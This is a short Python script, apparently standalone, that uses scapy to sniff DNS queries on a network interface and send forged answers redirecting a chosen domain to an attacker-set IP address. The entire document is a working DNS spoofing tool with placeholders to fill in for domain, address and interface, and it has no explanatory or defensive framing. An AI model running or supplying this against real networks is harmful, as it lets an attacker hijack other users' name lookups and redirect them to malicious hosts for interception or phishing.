from scapy.all import *

DOMAIN_TO_SPOOF = b'example.com.'

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        # Replace the values with the appropriate domain and IP
        if pkt[DNS].qd.qname == DOMAIN_TO_SPOOF:
            print(f"[*] Spoofing DNS request for {DOMAIN_TO_SPOOF}")
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='127.0.0.1') / \
                              DNSRR(rrname="example.com", type="A", ttl=10, rdata='127.0.0.1'))
            send(spoofed_pkt, verbose=0)

# Replace the interface with the appropriate network interface
sniff(filter='udp port 53', prn=dns_spoof, iface='eth0')
